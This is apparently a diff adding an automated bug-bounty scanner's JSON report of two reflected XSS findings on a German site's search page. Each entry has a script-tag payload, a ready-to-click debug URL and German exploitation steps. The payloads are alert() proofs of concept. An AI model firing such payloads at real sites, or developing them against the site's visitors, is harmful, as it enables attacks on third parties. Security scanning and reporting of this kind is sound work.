@@ -1,0 +1,28 @@
+[
+  {
+    "id": "lI596jCxgW2z",
+    "url": "https://tsg-einslingen.de/search.php",
+    "parameter": "q70",
+    "method": "GET",
+    "payload": "<script>alert('lI596jCxgW2z')</script>",
+    "type": "reflected_xss",
+    "severity": "medium",
+    "debug_url": "https://tsg-einslingen.de/search.php?q70=%3Cscript%3Ealert%28%27lI596jCxgW2z%27%29%3C/script%3E",
+    "screenshot": "/home/kali/bounty/Hunter/screenshots/xss_20250330_202657_lI596jCxgW2z.png",
+    "description": "Reflektierte Cross-Site-Scripting (XSS) Schwachstelle gefunden. Diese Schwachstelle erm\u00f6glicht es Angreifern, b\u00f6sartigen JavaScript-Code in die Webseite einzuschleusen, der im Browser des Opfers ausgef\u00fchrt wird.",
+    "how_to_exploit": "Um diese Schwachstelle auszunutzen, senden Sie den Parameter 'q70' mit dem Payload '<script>alert('lI596jCxgW2z')</script>' an die URL. Dies kann durch direkten Zugriff auf die Debug-URL oder durch Manipulation von Formulardaten erfolgen."
+  },
+  {
+    "id": "EXPcgQ6uXohV",
+    "url": "https://tsg-einslingen.de/search.php",
+    "parameter": "q140",
+    "method": "GET",
+    "payload": "<script>alert('EXPcgQ6uXohV')</script>",
+    "type": "reflected_xss",
+    "severity": "high",
+    "debug_url": "https://tsg-einslingen.de/search.php?q140=%3Cscript%3Ealert%28%27EXPcgQ6uXohV%27%29%3C/script%3E",
+    "screenshot": "/home/kali/bounty/Hunter/screenshots/xss_20250330_202657_EXPcgQ6uXohV.png",
+    "description": "Reflektierte Cross-Site-Scripting (XSS) Schwachstelle gefunden. Diese Schwachstelle erm\u00f6glicht es Angreifern, b\u00f6sartigen JavaScript-Code in die Webseite einzuschleusen, der im Browser des Opfers ausgef\u00fchrt wird.",
+    "how_to_exploit": "Um diese Schwachstelle auszunutzen, senden Sie den Parameter 'q140' mit dem Payload '<script>alert('EXPcgQ6uXohV')</script>' an die URL. Dies kann durch direkten Zugriff auf die Debug-URL oder durch Manipulation von Formulardaten erfolgen."
+  }
+]
